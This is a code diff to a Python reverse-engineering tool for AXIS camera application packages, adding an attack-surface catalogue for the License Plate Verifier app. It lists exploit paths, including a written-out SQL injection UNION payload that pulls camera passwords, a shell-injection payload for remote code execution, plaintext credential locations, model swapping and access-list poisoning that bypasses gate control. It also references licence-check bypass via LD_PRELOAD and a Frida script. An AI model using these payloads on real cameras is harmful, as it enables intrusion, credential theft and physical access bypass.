@@ -3,17 +3,20 @@ axis_eap_re — AXIS ACAP EAP package RE module
 
 Reverse engineers AXIS camera application packages (*.eap = gzip'd tar).
 Targets:
-  SipThirdPartyIntegration (aarch64 ELF, debug symbols, liblicensekey.so)
-  BarcodeReader             (ARM32 ELF, stripped, libaxhttp/libvdostream)
-  BodyWornLiveSelfHosted    (aarch64 Go static, WebRTC/coturn/MQTT/JWT)
-  facedetector              (aarch64 ELF, stripped, libvideo-object-detection)
+  SipThirdPartyIntegration  (aarch64 ELF, debug symbols, liblicensekey.so)
+  BarcodeReader              (ARM32 ELF, stripped, libaxhttp/libvdostream)
+  BodyWornLiveSelfHosted     (aarch64 Go static, WebRTC/coturn/MQTT/JWT)
+  facedetector               (aarch64 ELF, stripped, libvideo-object-detection)
+  AXIS License Plate Verifier (aarch64 ELF stripped; fflprapp; 11 TFLite models)
 
 Attack surface by component:
   licensekey_verify() bypass — LD_LIBRARY_PATH / LD_PRELOAD / /etc/ld.so.preload
-  SipThirdPartyIntegration — sipd dependency gate (post_install.sh exit 77 skip)
-  BodyWornLiveSelfHosted   — getStunTurnTestCredentials CGI, signaling JWT, coturn TURN creds
-  BarcodeReader            — VAPIX service account token, http://127.0.0.12/ loopback, libcurl
-  facedetector             — CVE-2024-47257 (AXIS) CGI param injection via protobuf decode
+  SipThirdPartyIntegration  — sipd dependency gate (post_install.sh exit 77 skip)
+  BodyWornLiveSelfHosted    — getStunTurnTestCredentials CGI, signaling JWT, coturn TURN creds
+  BarcodeReader             — VAPIX service account token, http://127.0.0.12/ loopback, libcurl
+  facedetector              — CVE-2024-47257 (AXIS) CGI param injection via protobuf decode
+  LicensePlateVerifier      — SQLite plaintext creds, SQL injection in search CGI,
+                               shell injection via curl format strings, cloud auth exposure
 
 Usage:
     from modules.axis_eap_re import AxisEAPAnalyzer
@@ -22,6 +25,7 @@ Usage:
     a.licensekey_bypass_vectors('/path/to/SipThirdPartyIntegration')
     a.bodyworn_attack_surface()
     a.barcode_vapix_surface()
+    a.lpv_surface()
 
 Standalone:
     python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --all
@@ -29,6 +33,7 @@ Standalone:
     python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --bodyworn
     python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --barcode
     python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --facedetector
+    python3 modules/axis_eap_re.py /media/cowboy/research/AXIS --lpv
     python3 modules/axis_eap_re.py /path/to/SipThirdPartyIntegration --license-bypass
 """
 
@@ -115,6 +120,7 @@ class AxisEAPAnalyzer:
         'BarcodeReader': 'barcode',
         'BodyWornLiveSelfHosted': 'bodyworn',
         'facedetector': 'facedetector',
+        'fflprapp': 'fflprapp',  # AXIS License Plate Verifier
     }
 
     # licensekey_verify bypass env vars (from disasm of licensekey_stat.c)
@@ -426,6 +432,216 @@ class AxisEAPAnalyzer:
 
         return result
 
+    def lpv_surface(self, pkg_dir: str | None = None) -> dict:
+        """
+        AXIS License Plate Verifier (fflprapp) aarch64 ELF attack surface.
+
+        Key findings from binary RE (appId 333330, ARTPEC-8 build, v3.0.13):
+
+        1. SQLite plaintext credentials
+           CREATE TABLE CAMERA_BWLIST(CAMERA_NAME,CAMERA_IP,CAMERA_LOGIN,CAMERA_PASSWORD...)
+           CREATE TABLE CAMERA_MASTER_BWLIST(...same schema...)
+           Stored in /usr/local/packages/fflprapp/localdata/cfg/*.db
+           Readable by any process with ACAP package read access.
+
+        2. SQL injection in search CGI (search.cgi / search_v.cgi / search_o.cgi)
+           Query strings: "AND LPR_UTF8 LIKE '%%%s%%'" / "AND COUNTRY LIKE '%%%s%%'"
+           / "AND LP_DESCRIPTION LIKE '%%%s%%'"
+           The %s is directly from CGI params — no parameterized query. Classic LIKE injection.
+           Access level: viewer (search_v.cgi), operator (search_o.cgi), admin (search.cgi).
+           LPR_EVENTS table contains: plate text, bitmaps (LP_BMP, ROI_BMP), coords, speed,
+           direction, car maker/model/color, ISO3166 code — PII-dense.
+
+        3. Shell injection via curl format strings (cloud integration)
+           Binary calls system()/popen() with:
+             "cp localdata/create_overlay.json /tmp;curl %s -o %s --anyauth -u '%s:%s' ..."
+             "curl %s --anyauth -u '%s:%s' '%s://%s/axis-cgi/io/port.cgi?action=%d%%3A%s'"
+           The %s parameters are from ax_parameter_get() (cloud_config/user, cloud_config/password,
+           a91xx_config/ipc_login, a91xx_config/ipc_password, etc.).
+           If an attacker can write to axparameter store (via config_o.cgi / api_o.cgi at operator
+           level), injecting shell metacharacters into these fields achieves RCE via popen().
+
+        4. Cloud integration credential exposure (3 cloud endpoints)
+           cloud_config/{user,password,http_auth_type,proxy_user,proxy_password,cloud_url}
+           hb_config/{user,password,http_auth_type}
+           a91xx_config/{ipc_login,ipc_password,a91xx_url,latitude,longitude}
+           gsc_config/{user,password}
+           All stored in axparameter persistent store; readable via test.cgi (operator).
+
+        5. upload.cgi — arbitrary .rcf / .db file write
+           Accepts multipart POST at operator level.
+           RCF (recognition config files) are loaded directly into ANPR engine.
+           Malformed RCF or path-traversal in filename field may reach filesystem write.
+
+        6. list_mgmt.cgi — allow/block/custom list mutation
+           Operator-level CGI controls vehicle access lists.
+           EventAllowList / EventBlockList / EventCustomList events flow to 2N/GSC/A91xx
+           integrations — list poisoning can suppress or spoof gate access events.
+
+        7. Heartbeat exposure (fflprapp_hb.json)
+           Reports: platform, version, IP, MAC, osVersion, anprVersion, device_ID,
+           numFrames, numberOfReads — device fingerprint sent to external HB endpoint.
+
+        8. ANPR model surface (TFLite, 11 files)
+           onnx_model_full_integer_quant.tflite (6.8M) — primary OCR model
+           Multi_detector_step1/2.tflite (3M each) — plate detection
+           LP_type_{aus,eu,gcc,sa,usa}.tflite — region classifiers
+           color_resnet_relu.tflite — vehicle color classification
+           Symbol.tflite — character recognizer
+           Models loaded via liblarod.so.1 (Axis ARTPEC ML accelerator).
+           No signature verification on model files — malicious .tflite substitution = model swap.
+
+        9. GitLab reference in binary
+           "http://gitlab.f-f.kyiv.ua/wikis/home" — Ukrainian GitLab instance embedded in
+           libexpat-derived XML error string; indicates third-party ANPR SDK origin (f-f = Flash
+           Forward, Kyiv-based ANPR vendor).
+
+        CGI access level map:
+          viewer:    events_v, tools_v, config_v, search_v, config_json_v, api_v, live.yuv
+          operator:  test, events_o, config_o, search_o, api_o, black/white/block/allow/custom_list,
+                     list_mgmt, count, upload, offline.yuv, config_json_o, config_json, tools_o
+          admin:     search, settings, config, config_nok*, config_axisa1001*, test_axisa1001,
+                     config_a1601, config_a91xx, config_2n, config_gsc, config_hb, config_hb_data,
+                     test_connect, cloud, cloud2, cloud3, events, tools, tools2, api, backup/restorecfg,
+                     vapix_events
+        """
+        if pkg_dir is None:
+            pd = self.packages.get('fflprapp')
+            if pd is not None:
+                pkg_dir = str(pd)
+
+        binary = str(Path(pkg_dir) / 'fflprapp') if pkg_dir else None
+
+        result = {
+            'binary': binary,
+            'app_id': 333330,
+            'app_name': 'AXIS License Plate Verifier',
+            'binary_name': 'fflprapp',
+            'arch': 'aarch64 ELF stripped',
+            'version': '3.0.13',
+            'sdk_origin': 'Flash Forward (f-f.kyiv.ua) ANPR SDK — ref in binary strings',
+            'libs': [
+                'libglib-2.0.so.0', 'libgobject-2.0.so.0', 'libgio-2.0.so.0',
+                'libturbojpeg.so.0', 'libaxparameter.so.1', 'libaxhttp.so.1',
+                'libaxevent.so.1', 'libcurl.so.4', 'libsqlite3.so.0',
+                'liblicensekey.so.1', 'libvdostream.so.1', 'liblarod.so.1',
+                'libaxstorage.so.1',
+            ],
+            'tflite_models': [
+                'onnx_model_full_integer_quant.tflite (6.8M) — primary OCR',
+                'Multi_detector_step1.tflite (3M), Multi_detector_step2.tflite (3M) — plate detection',
+                'LP_type_{aus,eu,gcc,sa,usa}.tflite (1.5M each) — region classifiers',
+                'color_resnet_relu.tflite (1.4M) — vehicle color',
+                'Symbol.tflite (3.1M) — character recognizer',
+            ],
+            'sqlite_schema': {
+                'LPR_EVENTS': (
+                    'TS,MOD_TS,END_TS,CAR_ID,LPR,LPR_UTF8,LPR_UNICODE,RTIME,ACTION,'
+                    'ACT_PARAM,THRESHOLD,ROI_X,ROI_Y,ROI_W,ROI_H,LP_X,LP_Y,LP_W,LP_H,'
+                    'ROI_ID,ROI_IDU,FRAMES,DISTANCE,SPEED,DIRECTION,LP_BMP,ROI_BMP,'
+                    'COUNTRY,LP_LIST_MODE,LP_DESCRIPTION,LP_REGION_UTF8,ISO3166_2_CODE,'
+                    'LP_TYPE,EXT1,EXT2,EXT3,CAR_MAKER,CAR_MODEL,CAR_M_TYPE,CAR_COLOR,'
+                    'CAR_CONF,CAR_VIEW,CAR_COLOR_CONF'
+                ),
+                'CAMERA_BWLIST': 'CAMERA_NAME,CAMERA_IP,CAMERA_LOGIN,CAMERA_PASSWORD,CAMERA_SYNC — plaintext creds',
+                'CAMERA_MASTER_BWLIST': 'same schema as CAMERA_BWLIST — master sync source',
+                'LPR_UAE': 'CAR_ID,GCC_PLATE_SERIES,GCC_COLOR,GCC_PLATE_TYPE',
+                'LPR_MMR_%d_CLASSES': 'BRAND,MODEL,TYPE — make/model/type lookup',
+                'LPR_VERSION': 'TS,MOD_TS,LPR_APP_VERSION,LPR_DB_VERSION,STATUS',
+            },
+            'attack_paths': [
+                {
+                    'id': 'LPV-1',
+                    'title': 'SQL injection in plate/country/description search params',
+                    'cgi': 'search_v.cgi (viewer), search_o.cgi (operator), search.cgi (admin)',
+                    'query': "AND LPR_UTF8 LIKE '%%%s%%' / AND COUNTRY LIKE '%%%s%%' / AND LP_DESCRIPTION LIKE '%%%s%%'",
+                    'impact': 'Read full LPR_EVENTS table: plates, bitmaps, GPS coords, speed, vehicle PII',
+                    'severity': 'HIGH',
+                    'exploit': "search_v.cgi?plate='+UNION+SELECT+CAMERA_PASSWORD,2,3,...+FROM+CAMERA_BWLIST--",
+                },
+                {
+                    'id': 'LPV-2',
+                    'title': 'Shell injection via cloud/integration credential fields',
+                    'cgi': 'config_o.cgi / api_o.cgi (operator-level write to axparameter)',
+                    'mechanism': (
+                        'cloud_config/user, cloud_config/password, a91xx_config/ipc_password, '
+                        'gsc_config/password interpolated into popen() curl command strings. '
+                        'Payload: user=x;cmd>/tmp/out;# → executes cmd on camera.'
+                    ),
+                    'impact': 'RCE as ACAP process user (acap-fflprapp); pivot to camera root via SUID',
+                    'severity': 'CRITICAL',
+                    'prerequisite': 'Operator-level auth to camera web interface',
+                },
+                {
+                    'id': 'LPV-3',
+                    'title': 'Plaintext camera credentials in SQLite DB',
+                    'path': '/usr/local/packages/fflprapp/localdata/cfg/*.db',
+                    'schema': 'CAMERA_BWLIST(CAMERA_IP, CAMERA_LOGIN, CAMERA_PASSWORD)',
+                    'impact': 'Lateral movement: credentials for synchronized cameras stored cleartext',
+                    'severity': 'HIGH',
+                    'access': 'Any process with read access to /usr/local/packages/fflprapp/',
+                },
+                {
+                    'id': 'LPV-4',
+                    'title': 'TFLite model substitution (no integrity check)',
+                    'path': '/usr/local/packages/fflprapp/models/*.tflite',
+                    'mechanism': 'liblarod.so.1 loads models by path; no hash/signature verification in strings',
+                    'impact': 'Swap onnx_model_full_integer_quant.tflite → adversarial model; suppress/spoof plate reads',
+                    'severity': 'MEDIUM',
+                    'prerequisite': 'Write access to package models dir (ACAP reinstall or filesystem access)',
+                },
+                {
+                    'id': 'LPV-5',
+                    'title': 'Access list poisoning via list_mgmt.cgi',
+                    'cgi': 'list_mgmt.cgi, allow_list.cgi, block_list.cgi, custom_list.cgi (operator)',
+                    'impact': 'Suppress EventBlockList or inject EventAllowList entries; physical access bypass at gates',
+                    'severity': 'HIGH',
+                    'integrations': '2N intercom, GSC3574, A91xx IPC, HB (heartbeat cloud)',
+                },
+                {
+                    'id': 'LPV-6',
+                    'title': 'Cloud integration credential exposure',
+                    'params': 'cloud_config/{user,password,http_auth_type,proxy_user,proxy_password,cloud_url}',
+                    'access': 'Readable via test.cgi (operator) and config_json_o.cgi (operator)',
+                    'impact': 'Cloud exfil endpoint credentials; proxy credential exposure',
+                    'severity': 'MEDIUM',
+                },
+            ],
+            'cloud_integrations': {
+                'cloud1': 'cloud_config — generic HTTP cloud; auth_type selectable; events: new/lost/update/reliable/on_list/on_direction/on_roi',
+                'cloud2': 'cloud2_config — second endpoint (fflprapp_cloud2.xml backup)',
+                'cloud3': 'cloud3_config — third endpoint (fflprapp_cloud3.xml backup)',
+                'hb': 'hb_config — heartbeat; sends device fingerprint JSON (IP, MAC, version, plate counts)',
+                '2n': '2N intercom integration — plate events trigger door unlock via AccessController token API',
+                'gsc': 'GSC3574 (Grandstream) integration — plate event push',
+                'a91xx': 'Dahua A91xx IPC — plate events; ipc_login/ipc_password in axparameter',
+                'a1601': 'Axis A1601 network door controller',
+                'a1001': 'Axis A1001 network door controller',
+            },
+            'heartbeat_data': {
+                'fields': 'platform, version, ipAddress, macAddress, osVersion, anprVersion, device_ID, numFrames, numberOfReads',
+                'note': 'Sent to cloud_config/cloud_url periodically; full device fingerprint in cleartext JSON',
+            },
+            'license_gate': 'liblicensekey.so.1 — same bypass vectors as SipThirdPartyIntegration (appId 333330)',
+        }
+
+        if pkg_dir and Path(pkg_dir).exists():
+            # Pull manifest for version confirmation
+            result['manifest'] = self._read_manifest(Path(pkg_dir))
+            # Count models
+            models_dir = Path(pkg_dir) / 'models'
+            if models_dir.is_dir():
+                result['model_count'] = len(list(models_dir.glob('*.tflite')))
+            # Verify SQL injection strings in binary
+            if binary and Path(binary).exists():
+                strs = _strings(binary, min_len=5)
+                result['sqli_strings_confirmed'] = any("AND LPR_UTF8 LIKE" in s for s in strs)
+                result['shell_injection_strings_confirmed'] = any('--anyauth' in s for s in strs)
+                result['camera_bwlist_confirmed'] = any('CAMERA_PASSWORD' in s for s in strs)
+                result['gitlab_ref_confirmed'] = any('gitlab.f-f.kyiv.ua' in s for s in strs)
+
+        return result
+
     def facedetector_surface(self) -> dict:
         """
         facedetector aarch64 ELF attack surface.
@@ -592,6 +808,7 @@ def main():
     parser.add_argument('--bodyworn', action='store_true', help='BodyWornLiveSelfHosted attack surface')
     parser.add_argument('--barcode', action='store_true', help='BarcodeReader VAPIX attack surface')
     parser.add_argument('--facedetector', action='store_true', help='facedetector CGI attack surface')
+    parser.add_argument('--lpv', action='store_true', help='License Plate Verifier (fflprapp) attack surface')
     parser.add_argument('--frida', action='store_true', help='Print Frida license bypass script')
     parser.add_argument('--json', action='store_true', help='Output JSON')
     args = parser.parse_args()
@@ -613,6 +830,9 @@ def main():
 
     if args.all or args.facedetector:
         results['facedetector'] = analyzer.facedetector_surface()
+
+    if args.all or args.lpv:
+        results['lpv'] = analyzer.lpv_surface()
 
     if args.frida:
         a = AxisEAPAnalyzer(args.target)
